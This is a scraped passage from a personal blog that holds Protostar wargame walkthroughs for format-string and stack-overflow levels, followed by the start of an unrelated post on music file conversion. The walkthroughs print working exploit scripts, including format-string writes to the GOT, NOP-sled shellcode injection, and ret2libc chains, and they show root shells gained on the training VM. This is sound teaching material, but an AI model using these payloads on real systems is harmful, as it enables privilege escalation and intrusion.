\u0026#34;\\xf4\\x96\\x04\\x08\u0026#34; + \u0026#34;\\xf5\\x96\\x04\\x08\u0026#34; + \u0026#34;\\xf6\\x96\\x04\\x08\u0026#34; # 68 = 56 + 12，这里的 12 是因为 target 已经有 12 bytes 了 f4 = \u0026#34;%56x\u0026#34; + \u0026#34;%12$n\u0026#34; # 但这里的 12 是因为上文提到 ABCD 出现在第 12 个参数 # 85 = 68 + 17 f5 = \u0026#34;%17x\u0026#34; + \u0026#34;%13$n\u0026#34; # 258 = 85 + 173 f6 = \u0026#34;%173x\u0026#34; + \u0026#34;%14$n\u0026#34; # echo 使用单引号，避免把 %?$n 解析成变量 command = \u0026lt;\u0026lt;-END echo \u0026#39;#{target}#{f4+f5+f6}\u0026#39; | /opt/protostar/bin/format3 END puts command puts `#{command}`  Format Four  format4 looks at one method of redirecting execution in a process.\nHints:\n objdump -TR is your friend  This level is at /opt/protostar/bin/format4\n #include \u0026lt;stdlib.h\u0026gt;#include \u0026lt;unistd.h\u0026gt;#include \u0026lt;stdio.h\u0026gt;#include \u0026lt;string.h\u0026gt; int target; void hello() { printf(\u0026#34;code execution redirected! you win\\n\u0026#34;); _exit(1); } void vuln() { char buffer[512]; fgets(buffer, sizeof(buffer), stdin); printf(buffer); exit(1); } int main(int argc, char **argv) { vuln(); }  user@protostar:/tmp/format$ objdump -TR /opt/protostar/bin/format4 /opt/protostar/bin/format4: file format elf32-i386 DYNAMIC SYMBOL TABLE: 00000000 w D *UND*\t00000000 __gmon_start__ 00000000 DF *UND*\t00000000 GLIBC_2.0 fgets 00000000 DF *UND*\t00000000 GLIBC_2.0 __libc_start_main 00000000 DF *UND*\t00000000 GLIBC_2.0 _exit 00000000 DF *UND*\t00000000 GLIBC_2.0 printf 00000000 DF *UND*\t00000000 GLIBC_2.0 puts 00000000 DF *UND*\t00000000 GLIBC_2.0 exit 080485ec g DO .rodata\t00000004 Base _IO_stdin_used 08049730 g DO .bss\t00000004 GLIBC_2.0 stdin DYNAMIC RELOCATION RECORDS OFFSET TYPE VALUE 080496fc R_386_GLOB_DAT __gmon_start__ 08049730 R_386_COPY stdin 0804970c R_386_JUMP_SLOT __gmon_start__ 08049710 R_386_JUMP_SLOT fgets 08049714 R_386_JUMP_SLOT __libc_start_main 08049718 R_386_JUMP_SLOT _exit 0804971c R_386_JUMP_SLOT printf 08049720 R_386_JUMP_SLOT puts 08049724 R_386_JUMP_SLOT exit DYNAMIC RELOCATION RECORDS 中，GLIBC exit 函数实际指向的地址是 0x08049724\n所以目标就是在 0x08049724 写入 void hello() 的地址，也就是 0x080484b4\nuser@protostar:/tmp/format$ /opt/protostar/bin/format4 ABCD%08x|%08x|%08x|%08x|%08x|%08x ABCD00000200|b7fd8420|bffff5d4|44434241|78383025|3830257c ABCD 出现在第 4 个参数\n接下来考虑一下如何写入 0x080484b4 这个值\n可以分为三步：\n 在 0x08049724 写入 0xb4 也就是十进制 180 因为第二个值只能大于第一个值，所以在 0x08049725 写入 0x0484 也就是十进制 1156 因为第三个值只能大于第二个值，而 0x08 怎么看都小于 0x0484，所以可以写入 0x0508。05 是随便的一个数字，目标仅仅只是让整个值大于第二个。同时我们并不关心这里的 0x05 到底被写哪去了，我们只需要使 0x08049727 这个 byte 上确实是 0x08 就可以了。以及 0x0508 的十进制是 1288  target = \u0026#39;\\x24\\x97\\x04\\x08\u0026#39; + \u0026#39;\\x25\\x97\\x04\\x08\u0026#39; + \u0026#39;\\x27\\x97\\x04\\x08\u0026#39; # 180 = 168 + 12：target 已经是 12 bytes 了 h24 = \u0026#34;%168x\u0026#34; + \u0026#34;%4$n\u0026#34; # 1156 = 976 + 180 h25 = \u0026#34;%976x\u0026#34; + \u0026#34;%5$n\u0026#34; # 1288 = 1156 + 132 h27 = \u0026#34;%132x\u0026#34; + \u0026#34;%6$n\u0026#34; command = \u0026lt;\u0026lt;-END ruby -e \u0026#39;puts \u0026#34;#{target}#{h24+h25+h27}\u0026#34;\u0026#39; | /opt/protostar/bin/format4 END puts command system(command) 这里有个很奇怪的问题，也就是 target 中的 \\x27 对应着 ASCII 中的单引号，结果会让 echo 以为语句已经结束了\u0026hellip;\n解决办法姑且是换成 ruby -e\n但还有个很奇怪的问题，如果要执行的语句里含有 ruby -e 那么 puts `#{command}` 是完全没有任何输出的\u0026hellip;甚至可能没有执行\n所以只能换成 system(command) 了\n顺带一提 puts `#{command}`  的 Markdown 语法是\n``puts `#{command}` `` ","date":"2022-03-30T00:00:00Z","image":"/p/protostar_format_0-4/cover_hu26b9c4d780e35c305fc3142cfdfe9749_924530_120x120_fill_box_smart1_3.png","permalink":"/p/protostar_format_0-4/","title":"Protostar Format 0-4 Walkthrough"},{"content":"所有的 python 脚本已经放在了这里\n Protostar ☞ Protostar\nProtostar introduces the following in a friendly way:\n Network programming Byte order Handling sockets Stack overflows Format strings Heap overflows The above is introduced in a simple way, starting with simple memory corruption and modification, function redirection, and finally executing custom shellcode.  In order to make this as easy as possible to introduce Address Space Layout Randomisation and Non-Executable memory has been disabled. If you are interested in covering ASLR and NX memory, please see the Fusion page.\n shell-storm ☞ shell-storm\n有各种各样的 Shellcode\n比较常用的是这个\n/* * $Id: gets-linux.c,v 1.3 2004/06/02 12:22:30 raptor Exp $ * * gets-linux.c - stdin re-open shellcode for Linux/x86 * Copyright (c) 2003 Marco Ivaldi \u0026lt;raptor@0xdeadbeef.info\u0026gt; * * Local shellcode for stdin re-open and /bin/sh exec. It closes stdin * descriptor and re-opens /dev/tty, then does an execve() of /bin/sh. * Useful to exploit some gets() buffer overflows in an elegant way... */ char sc[] = \u0026#34;\\x31\\xc0\\x31\\xdb\\xb0\\x06\\xcd\\x80\u0026#34; \u0026#34;\\x53\\x68/tty\\x68/dev\\x89\\xe3\\x31\\xc9\\x66\\xb9\\x12\\x27\\xb0\\x05\\xcd\\x80\u0026#34; \u0026#34;\\x31\\xc0\\x50\\x68//sh\\x68/bin\\x89\\xe3\\x50\\x53\\x89\\xe1\\x99\\xb0\\x0b\\xcd\\x80\u0026#34;;  乱七八糟的笔记    正常情况下在一个函数看来栈的布局     [higher memory]   caller\u0026rsquo;s frame   argument passed by the caller   return address   saved ebp ☜ ebp   local variable 1   local variable 2   local variable 3 ☜ esp   [lower memory]     关于 gdb 的 x/ 命令用法： x /[Length][Format] [Address expression]\n例： x/24wx $esp x/2i $eip\n define hook-stop 的用法：\ninfo registers x/24wx $esp x/2i $eip end  以及：\n(gdb) set disassembly-flavor intel  $ ls -al /opt/protostar/bin/ | grep stack -rwsr-xr-x 1 root root 22412 Nov 24 2011 stack0 -rwsr-xr-x 1 root root 23196 Nov 24 2011 stack1 -rwsr-xr-x 1 root root 23350 Nov 24 2011 stack2 -rwsr-xr-x 1 root root 23130 Nov 24 2011 stack3 -rwsr-xr-x 1 root root 22860 Nov 24 2011 stack4 -rwsr-xr-x 1 root root 22612 Nov 24 2011 stack5 -rwsr-xr-x 1 root root 23331 Nov 24 2011 stack6 -rwsr-xr-x 1 root root 23461 Nov 24 2011 stack7  Stack Zero ~ Three ☞ 为了避免太长就被隐藏在这里了x\n Stack Four  Stack4 takes a look at overwriting saved EIP and standard buffer overflows.\nThis level is at /opt/protostar/bin/stack4\nHints\n A variety of introductory papers into buffer overflows may help. gdb lets you do “run \u0026lt; input” EIP is not directly after the end of buffer, compiler padding can also increase the size.   #include \u0026lt;stdlib.h\u0026gt;#include \u0026lt;unistd.h\u0026gt;#include \u0026lt;stdio.h\u0026gt;#include \u0026lt;string.h\u0026gt; void win() { printf(\u0026#34;code flow successfully changed\\n\u0026#34;); } int main(int argc, char **argv) { char buffer[64]; gets(buffer); }  首先 objdump 找到 void win() 的地址\nuser@protostar:/opt/protostar/bin$ objdump -t /opt/protostar/bin/stack4 | grep win 080483f4 g F .text\t00000014 win 然后，如何知道 main() 会返回到哪里呢\u0026hellip;.\n(gdb) disassemble main Dump of assembler code for function main: 0x08048408 \u0026lt;main+0\u0026gt;:\tpush %ebp 0x08048409 \u0026lt;main+1\u0026gt;:\tmov %esp,%ebp 0x0804840b \u0026lt;main+3\u0026gt;:\tand $0xfffffff0,%esp 0x0804840e \u0026lt;main+6\u0026gt;:\tsub $0x50,%esp 0x08048411 \u0026lt;main+9\u0026gt;:\tlea 0x10(%esp),%eax 0x08048415 \u0026lt;main+13\u0026gt;:\tmov %eax,(%esp) 0x08048418 \u0026lt;main+16\u0026gt;:\tcall 0x804830c \u0026lt;gets@plt\u0026gt; 0x0804841d \u0026lt;main+21\u0026gt;:\tleave 0x0804841e \u0026lt;main+22\u0026gt;:\tret End of assembler dump. 首先在 0x0804841e \u0026lt;main+22\u0026gt;:\tret 处设置断点\n(gdb) break *0x0804841e Breakpoint 1 at 0x804841e: file stack4/stack4.c, line 16. 为了方便可以写一个字母表\u0026hellip;就大概知道栈溢出到了什么地方..总之就是为了方便x\nuser@protostar:/tmp$ more alb AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTTUUUUVVVV 运行，并查看栈\n这里就 x/24wx $esp 好了\n(gdb) run \u0026lt; alb Starting program: /opt/protostar/bin/stack4 \u0026lt; alb Breakpoint 1, 0x0804841e in main (argc=Cannot access memory at address 0x5353535b ) at stack4/stack4.c:16 16\tin stack4/stack4.c (gdb) x/24wx $esp 0xbffff79c:\t0x54545454\t0x55555555\t0x56565656\t0xbffff800 0xbffff7ac:\t0xb7fe1848\t0xbffff800\t0xffffffff\t0xb7ffeff4 0xbffff7bc:\t0x0804824b\t0x00000001\t0xbffff800\t0xb7ff0626 0xbffff7cc:\t0xb7fffab0\t0xb7fe1b28\t0xb7fd7ff4\t0x00000000 0xbffff7dc:\t0x00000000\t0xbffff818\t0xfc365215\t0xd6616405 0xbffff7ec:\t0x00000000\t0x00000000\t0x00000000\t0x00000001 可见现在栈最高处存着 0x54545454，而这就是 EIP 马上会取的 Return Address\n前进一步看看\n(gdb) si Cannot access memory at address 0x53535357 (gdb) info registers eax 0xbffff750\t-1073744048 ecx 0xbffff750\t-1073744048 edx 0xb7fd9334\t-1208118476 ebx 0xb7fd7ff4\t-1208123404 esp 0xbffff7a0\t0xbffff7a0 ebp 0x53535353\t0x53535353 esi 0x0\t0 edi 0x0\t0 eip 0x54545454\t0x54545454 eflags 0x200246\t[ PF ZF IF ID ] cs 0x73\t115 ss 0x7b\t123 ds 0x7b\t123 es 0x7b\t123 fs 0x0\t0 gs 0x33\t51 看来确实是 eip 0x54545454\n接下来只要把 0x54545454 改成 void win() 的地址即可\nuser@protostar:/tmp$ more stack4.py padding = \u0026#34;AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSS\u0026#34; win = \u0026#34;\\xf4\\x83\\x04\\x08\u0026#34; print (padding + win) user@protostar:/tmp$ python stack4.py | /opt/protostar/bin/stack4 code flow successfully changed Segmentation fault user@protostar:/tmp$  Stack Five  Stack5 is a standard buffer overflow, this time introducing shellcode.\nThis level is at /opt/protostar/bin/stack5\nHints\n At this point in time, it might be easier to use someone elses shellcode If debugging the shellcode, use \\xcc (int3) to stop the program executing and return to the debugger remove the int3s once your shellcode is done.   #include \u0026lt;stdlib.h\u0026gt;#include \u0026lt;unistd.h\u0026gt;#include \u0026lt;stdio.h\u0026gt;#include \u0026lt;string.h\u0026gt; int main(int argc, char **argv) { char buffer[64]; gets(buffer); }  终于可以开始执行 shellcode 了，好耶w\n首先通过与上题一样的步骤，我们可以改函数的 Return Address\n想执行 shellcode 的简单思路就是：\n 把 shellcode 写到栈上 把 Return Address 指向写了 shellcode 的地方  但是，由于环境变量等种种问题，很可能程序每次在栈上的地址都不太一样，\n这种情况可以在 shellcode 前填充大量的 NOP\u0026hellip;这样的话不管 Return Address 指向了哪里，反正只要指向了这一大段冇用的 NOP 的话那么最终就能到达 shellcode\nNOP 的详细定义：\n The NOP instruction does nothing. Execution continues with the next instruction. No registers or flags are affected by this instruction. NOP is typically used to generate a delay in execution or to reserve space in code memory.\n 不过说起来，Hints 里提到过：\n If debugging the shellcode, use \\xcc (int3) to stop the program executing and return to the debugger\n 来看一下 \\xCC (int3) 的定义：\n The INT3 instruction is a one-byte-instruction defined for use by debuggers to temporarily replace an instruction in a running program in order to set a code breakpoint.\n 来试一下，首先找个地址来当 Return Address\n(gdb) disassemble main Dump of assembler code for function main: 0x080483c4 \u0026lt;main+0\u0026gt;:\tpush ebp 0x080483c5 \u0026lt;main+1\u0026gt;:\tmov ebp,esp 0x080483c7 \u0026lt;main+3\u0026gt;:\tand esp,0xfffffff0 0x080483ca \u0026lt;main+6\u0026gt;:\tsub esp,0x50 0x080483cd \u0026lt;main+9\u0026gt;:\tlea eax,[esp+0x10] 0x080483d1 \u0026lt;main+13\u0026gt;:\tmov DWORD PTR [esp],eax 0x080483d4 \u0026lt;main+16\u0026gt;:\tcall 0x80482e8 \u0026lt;gets@plt\u0026gt; 0x080483d9 \u0026lt;main+21\u0026gt;:\tleave 0x080483da \u0026lt;main+22\u0026gt;:\tret End of assembler dump. (gdb) break *0x080483da Breakpoint 1 at 0x80483da: file stack5/stack5.c, line 11. (gdb) r Starting program: /opt/protostar/bin/stack5 Hello Breakpoint 1, 0x080483da in main (argc=134513604, argv=0x1) at stack5/stack5.c:11 11\tstack5/stack5.c: No such file or directory. in stack5/stack5.c (gdb) x/24wx $esp 0xbffff79c:\t0xb7eadc76\t0x00000001\t0xbffff844\t0xbffff84c 0xbffff7ac:\t0xb7fe1848\t0xbffff800\t0xffffffff\t0xb7ffeff4 0xbffff7bc:\t0x08048232\t0x00000001\t0xbffff800\t0xb7ff0626 0xbffff7cc:\t0xb7fffab0\t0xb7fe1b28\t0xb7fd7ff4\t0x00000000 0xbffff7dc:\t0x00000000\t0xbffff818\t0xf982f58c\t0xd3d5c39c 0xbffff7ec:\t0x00000000\t0x00000000\t0x00000000\t0x00000001 随便选一个\u0026hellip;比如 0xbffff7dc\n# stack5.py import struct padding = \u0026#34;AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSS\u0026#34; return_address = struct.pack(\u0026#34;I\u0026#34;, 0xbffff7dc + 10) nop = \u0026#34;\\x90\u0026#34; * 300 int3 = \u0026#34;\\xCC\\xCC\\xCC\\xCC\u0026#34; print (padding + return_address + nop + int3) # 接下来 python stack5.py \u0026gt; st5 (gdb) r \u0026lt; st5 Starting program: /opt/protostar/bin/stack5 \u0026lt; st5 Program received signal SIGTRAP, Trace/breakpoint trap. 0xbffff8cd in ?? () (gdb) Program received signal SIGTRAP, Trace/breakpoint trap. 看起来是成功了\n接下来把 shellcode 也加进去吧，就用最开头的那个\n# stack5.py import struct padding = \u0026#34;AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSS\u0026#34; return_address = struct.pack(\u0026#34;I\u0026#34;, 0xbffff7dc + 10) nop = \u0026#34;\\x90\u0026#34; * 300 int3 = \u0026#34;\\xCC\\xCC\\xCC\\xCC\u0026#34; shellcode = \u0026#34;\\x31\\xc0\\x31\\xdb\\xb0\\x06\\xcd\\x80\\x53\\x68/tty\\x68/dev\\x89\\xe3\\x31\\xc9\\x66\\xb9\\x12\\x27\\xb0\\x05\\xcd\\x80\\x31\\xc0\\x50\\x68//sh\\x68/bin\\x 89\\xe3\\x50\\x53\\x89\\xe1\\x99\\xb0\\x0b\\xcd\\x80\u0026#34; # 注意这里把 int3 去掉了 print (padding + return_address + nop + shellcode) user@protostar:/tmp$ python stack5.py | /opt/protostar/bin/stack5 # whoami root #  完成w\n Stack Six  Stack6 looks at what happens when you have restrictions on the return address.\nThis level can be done in a couple of ways, such as finding the duplicate of the payload ( objdump -s will help with this), or ret2libc , or even return orientated programming.\nIt is strongly suggested you experiment with multiple ways of getting your code to execute here.\nThis level is at /opt/protostar/bin/stack6\n #include \u0026lt;stdlib.h\u0026gt;#include \u0026lt;unistd.h\u0026gt;#include \u0026lt;stdio.h\u0026gt;#include \u0026lt;string.h\u0026gt; void getpath() { char buffer[64]; unsigned int ret; printf(\u0026#34;input path please: \u0026#34;); fflush(stdout); gets(buffer); ret = __builtin_return_address(0); if((ret \u0026amp; 0xbf000000) == 0xbf000000) { printf(\u0026#34;bzzzt (%p)\\n\u0026#34;, ret); _exit(1); } printf(\u0026#34;got path %s\\n\u0026#34;, buffer); } int main(int argc, char **argv) { getpath(); } 先看这部分：\nret = __builtin_return_address(0); if((ret \u0026amp; 0xbf000000) == 0xbf000000) { printf(\u0026#34;bzzzt (%p)\\n\u0026#34;, ret); _exit(1); } 有一个 if((ret \u0026amp; 0xbf000000) == 0xbf000000) 的操作\u0026hellip;简单来说相当于是如果 ret 以 bf 开头的话那么条件为真（结果就是_exit(1)）\n(gdb) break main Breakpoint 1 at 0x8048500: file stack6/stack6.c, line 27. (gdb) r Starting program: /opt/protostar/bin/stack6 Breakpoint 1, main (argc=1, argv=0xbffff844) at stack6/stack6.c:27 27\tstack6/stack6.c: No such file or directory. in stack6/stack6.c (gdb) info proc map process 5679 cmdline = \u0026#39;/opt/protostar/bin/stack6\u0026#39; cwd = \u0026#39;/tmp\u0026#39; exe = \u0026#39;/opt/protostar/bin/stack6\u0026#39; Mapped address spaces: Start Addr End Addr Size Offset objfile 0x8048000 0x8049000 0x1000 0 /opt/protostar/bin/stack6 0x8049000 0x804a000 0x1000 0 /opt/protostar/bin/stack6 0xb7e96000 0xb7e97000 0x1000 0 0xb7e97000 0xb7fd5000 0x13e000 0 /lib/libc-2.11.2.so 0xb7fd5000 0xb7fd6000 0x1000 0x13e000 /lib/libc-2.11.2.so 0xb7fd6000 0xb7fd8000 0x2000 0x13e000 /lib/libc-2.11.2.so 0xb7fd8000 0xb7fd9000 0x1000 0x140000 /lib/libc-2.11.2.so 0xb7fd9000 0xb7fdc000 0x3000 0 0xb7fe0000 0xb7fe2000 0x2000 0 0xb7fe2000 0xb7fe3000 0x1000 0 [vdso] 0xb7fe3000 0xb7ffe000 0x1b000 0 /lib/ld-2.11.2.so 0xb7ffe000 0xb7fff000 0x1000 0x1a000 /lib/ld-2.11.2.so 0xb7fff000 0xb8000000 0x1000 0x1b000 /lib/ld-2.11.2.so 0xbffeb000 0xc0000000 0x15000 0 [stack] (gdb) 可见 0xbffeb000 - 0xc0000000 都是栈\u0026hellip;\n那么就变成了：「只要 ret 指向栈上的某个地址，那么就会 _exit(1)」\n exploit #0 : ret2ret 瞎取的名字x\n即，虽然它会检查 ret 要返回到的地址会不会被修改到栈上\u0026hellip;\n但如果 ret 到自己呢\u0026hellip;\n(gdb) disassemble getpath Dump of assembler code for function getpath: # 省略一部分 0x080484c2 \u0026lt;getpath+62\u0026gt;:\tjne 0x80484e4 \u0026lt;getpath+96\u0026gt; 0x080484c4 \u0026lt;getpath+64\u0026gt;:\tmov eax,0x80485e4 0x080484c9 \u0026lt;getpath+69\u0026gt;:\tmov edx,DWORD PTR [ebp-0xc] 0x080484cc \u0026lt;getpath+72\u0026gt;:\tmov DWORD PTR [esp+0x4],edx 0x080484d0 \u0026lt;getpath+76\u0026gt;:\tmov DWORD PTR [esp],eax 0x080484d3 \u0026lt;getpath+79\u0026gt;:\tcall 0x80483c0 \u0026lt;printf@plt\u0026gt; 0x080484d8 \u0026lt;getpath+84\u0026gt;:\tmov DWORD PTR [esp],0x1 0x080484df \u0026lt;getpath+91\u0026gt;:\tcall 0x80483a0 \u0026lt;_exit@plt\u0026gt; 0x080484e4 \u0026lt;getpath+96\u0026gt;:\tmov eax,0x80485f0 0x080484e9 \u0026lt;getpath+101\u0026gt;:\tlea edx,[ebp-0x4c] 0x080484ec \u0026lt;getpath+104\u0026gt;:\tmov DWORD PTR [esp+0x4],edx 0x080484f0 \u0026lt;getpath+108\u0026gt;:\tmov DWORD PTR [esp],eax 0x080484f3 \u0026lt;getpath+111\u0026gt;:\tcall 0x80483c0 \u0026lt;printf@plt\u0026gt; 0x080484f8 \u0026lt;getpath+116\u0026gt;:\tleave 0x080484f9 \u0026lt;getpath+117\u0026gt;:\tret End of assembler dump. 比如 0x080484f9 \u0026lt;getpath+117\u0026gt;:\tret 这里会被检查是否 ret 到了栈上 但如果 ret 到自己（0x080484f9 \u0026lt;getpath+117\u0026gt;）的话，那接下来这一次 ret 要到的地址就不会被检查\u0026hellip;\n#stack6_0.py import struct padding = \u0026#34;AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPUUUURRRRSSSSTTTT\u0026#34; # 第一次 ret 到 0x080484f9 也就是 ret 自己所处的地址 ret_first_time = struct.pack(\u0026#34;I\u0026#34;, 0x080484f9) # 第二次 ret 到栈上随便某个地方 ret_second_time = struct.pack(\u0026#34;I\u0026#34;, 0xbffff7dc + 30) nop = \u0026#34;\\x90\u0026#34; * 300 shellcode = \u0026#34;\\x31\\xc0\\x31\\xdb\\xb0\\x06\\xcd\\x80\\x53\\x68/tty\\x68/dev\\x89\\xe3\\x31\\xc9\\x66\\xb9\\x12\\x27\\xb0\\x05\\xcd\\x80\\x31\\xc0\\x50\\x68//sh\\x68/bin\\x89\\xe3\\x50\\x53\\x89\\xe1\\x99\\xb0\\x0b\\xcd\\x80\u0026#34; print (padding + ret_first_time + ret_second_time + nop + shellcode) user@protostar:/tmp$ python stack6_0.py | /opt/protostar/bin/stack6 input path please: got path AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPP?RRRRSSSSTTTT?????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????1?1۰̀Sh/ttyh/dev??1?f?\u0026#39;?̀1?Ph//shh/bin??PS?ᙰ ̀ # whoami root #   exploit #1 : ret2libc  A Ret2libC attack allows us to call the C function system and a function called exit in order to spawn a shell and thereafter allow the program to exit cleanly without arousing any suspicion.\n 既然想执行 /bin/sh 的话，首先得调用 system\n(gdb) p system $1 = {\u0026lt;text variable, no debug info\u0026gt;} 0xb7ecffb0 \u0026lt;__libc_system\u0026gt; 然后找找 /bin/sh 在哪\nuser@protostar:/tmp$ strings -a -t x /lib/libc-2.11.2.so | grep \u0026#34;/bin/sh\u0026#34; 11f3bf /bin/sh (gdb) info proc map process 5972 cmdline = \u0026#39;/opt/protostar/bin/stack6\u0026#39; cwd = \u0026#39;/tmp\u0026#39; exe = \u0026#39;/opt/protostar/bin/stack6\u0026#39; Mapped address spaces: Start Addr End Addr Size Offset objfile 0x8048000 0x8049000 0x1000 0 /opt/protostar/bin/stack6 0x8049000 0x804a000 0x1000 0 /opt/protostar/bin/stack6 0xb7e96000 0xb7e97000 0x1000 0 0xb7e97000 0xb7fd5000 0x13e000 0 /lib/libc-2.11.2.so 0xb7fd5000 0xb7fd6000 0x1000 0x13e000 /lib/libc-2.11.2.so 0xb7fd6000 0xb7fd8000 0x2000 0x13e000 /lib/libc-2.11.2.so 0xb7fd8000 0xb7fd9000 0x1000 0x140000 /lib/libc-2.11.2.so 0xb7fd9000 0xb7fdc000 0x3000 0 0xb7fe0000 0xb7fe2000 0x2000 0 0xb7fe2000 0xb7fe3000 0x1000 0 [vdso] 0xb7fe3000 0xb7ffe000 0x1b000 0 /lib/ld-2.11.2.so 0xb7ffe000 0xb7fff000 0x1000 0x1a000 /lib/ld-2.11.2.so 0xb7fff000 0xb8000000 0x1000 0x1b000 /lib/ld-2.11.2.so 0xbffeb000 0xc0000000 0x15000 0 [stack] 可见 /lib/libc-2.11.2.so 的 Start Addr 是 0xb7e97000\n(gdb) x/s 0xb7e97000+0x11f3bf 0xb7fb63bf:\t\u0026#34;/bin/sh\u0026#34; 那么\n\u0026lt;__libc_system\u0026gt;: 0xb7ecffb0\n/bin/sh: 0xb7fb63bf\n再回顾一下：\n   正常情况下在一个函数看来栈的布局     [higher memory]   caller\u0026rsquo;s frame   argument passed by the caller   return address   saved ebp ☜ ebp   local variable 1   local variable 2   local variable 3 ☜ esp   [lower memory]    我们并非通过 Call 来到达 System 的，而是直接跳过去的，\n所以必须得把栈变成上面的形状才能正常正常运行\n这里使用的是 ☞ cdecl 调用公约\n其中，/bin/sh: 0xb7fb63bf 这个地址就是 System 的参数，也就是一个字符串的地址\n但是还需要另一个参数，是 System 执行完成后的返回地址（这个地址可以乱写，但不能没有）\n（system 把参数的字符串当成 shell command 来执行）\n   对应一下：      [higher memory]    caller\u0026rsquo;s frame    argument passed by the caller ☜ return_addr_after_system + /bin/sh: 0xb7fb63bf   return address ☜ \u0026lt;__libc_system\u0026gt;: 0xb7ecffb0   saved ebp ☜ ebp ☜ we dont care   local variable 1    local variable 2    local variable 3 ☜ esp ☜ buffer overflow begins   [lower memory]     可以试试了\n# stack6_1.py import struct padding = \u0026#34;AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPUUUURRRRSSSSTTTT\u0026#34; libc_system = struct.pack(\u0026#34;I\u0026#34;, 0xb7ecffb0) return_addr_after_system = \u0026#34;AAAA\u0026#34; bin_sh_addr = struct.pack(\u0026#34;I\u0026#34;, 0xb7fb63bf) print (padding + libc_system + return_addr_after_system + bin_sh_addr) user@protostar:/tmp$ python stack6_1.py | /opt/protostar/bin/stack6 input path please: got path AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPP???RRRRSSSSTTTT???AAAA?c?? Segmentation fault user@protostar:/tmp$ 为什么就没有了呢，怎么会是呢\n实际上确实已经有一个 /bin/sh 生成了，可是还什么都没输入就退出了\n这时候可以使用 cat\n直接执行 cat 的话，效果是复读\nuser@protostar:/tmp$ cat Hello Hello Hey Hey Minty daisuki x Minty daisuki x ^C user@protostar:/tmp$ 把命令改成这样可以保证 shell 一直打开，并通过管道来重定向输入\n(python stack6_1.py; cat) | /opt/protostar/bin/stack6 试一下的话\nuser@protostar:/tmp$ (python stack6_1.py; cat) | /opt/protostar/bin/stack6 input path please: got path AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPP???RRRRSSSSTTTT???AAAA?c?? whoami root ls / bin boot dev\tetc home initrd.img lib live lost+found media mnt opt proc sbin selinux srv sys tmp usr\tvar vmlinuz 成功w\n Stack Seven  Stack6 introduces return to .text to gain code execution.\nThe metasploit tool “msfelfscan” can make searching for suitable instructions very easy, otherwise looking through objdump output will suffice.\nThis level is at /opt/protostar/bin/stack7\n #include \u0026lt;stdlib.h\u0026gt;#include \u0026lt;unistd.h\u0026gt;#include \u0026lt;stdio.h\u0026gt;#include \u0026lt;string.h\u0026gt; char *getpath() { char buffer[64]; unsigned int ret; printf(\u0026#34;input path please: \u0026#34;); fflush(stdout); gets(buffer); ret = __builtin_return_address(0); if((ret \u0026amp; 0xb0000000) == 0xb0000000) { printf(\u0026#34;bzzzt (%p)\\n\u0026#34;, ret); _exit(1); } printf(\u0026#34;got path %s\\n\u0026#34;, buffer); return strdup(buffer); } int main(int argc, char **argv) { getpath(); } 实际上这题和上面的 Stack Six 差不多，结合一下 ret2ret 和 ret2libc 就可以了\nimport struct padding = \u0026#34;AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPUUUURRRRSSSSTTTT\u0026#34; ret_itself_addr = struct.pack(\u0026#34;I\u0026#34;, 0x08048544) libc_system = struct.pack(\u0026#34;I\u0026#34;, 0xb7ecffb0) return_addr_after_system = \u0026#34;AAAA\u0026#34; bin_sh_addr = struct.pack(\u0026#34;I\u0026#34;, 0xb7fb63bf) print (padding+ ret_itself_addr + libc_system + return_addr_after_system + bin_sh_addr) user@protostar:/tmp$ (python stack7.py; cat) | /opt/protostar/bin/stack7 input path please: got path AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPDRRRRSSSSTTTTD???AAAA?c?? whoami root ls / bin boot dev\tetc home initrd.img lib live lost+found media mnt opt proc sbin selinux srv sys tmp usr\tvar vmlinuz ","date":"2022-03-22T00:00:00Z","image":"/p/protostar_stack_4-7/cover_hu89b69cad7273891b1af867ec9c4a2eb7_439381_120x120_fill_box_smart1_3.png","permalink":"/p/protostar_stack_4-7/","title":"Protostar Stack 0-7 Walkthrough"},{"content":"！失效了 ！\n有人发现上面这个是在模仿黑魂一的「中毒了」提示么x\n选项 #1 选项 #2 mp3.aoleiao.com\n叹气气 总之以后就方便多了\n这篇还是姑且留在这里吧..\n 首先的话..姑且先是常规操作\n基操 Mac 上的格式转换软件 这里只推荐 XLD，真的yyds（\n免费功能还多还方便\n顺带一提： 很重要的一件事情就是 iTunes 不认识 Flac 的所以建议全部导出成 Apple Loseless\n 网易云私有格式 NCM → FLAC / MP3 这里的话..直接用 这个 ncm.worthsee.com 就能全部转换\n唯一的问题是，至少在 Safari 上的「批量下载」是会有遗漏的\u0026hellip;所以还是一首一首点比较好\n坑：\n很离谱，转换出来如果是 Flac 的话所有的 Meta 信息都会丢失..\n封面艺术家专辑名之类的全部没了x 草\n\u0026hellip;总之请继续往后看吧\n Mac 上的 Meta 信息编辑软件 推荐软件：就叫「META」\n可以批量编辑，也可以搜索 iTunes Store 的专辑封面帮你填充上去\n 进阶 关于因为 NCM → FLAC 所造成的 Meta 信息丢失的「批量」解决办法 姑且有以下解决办法：\n1. 网易云音乐，设置下载音质：无损 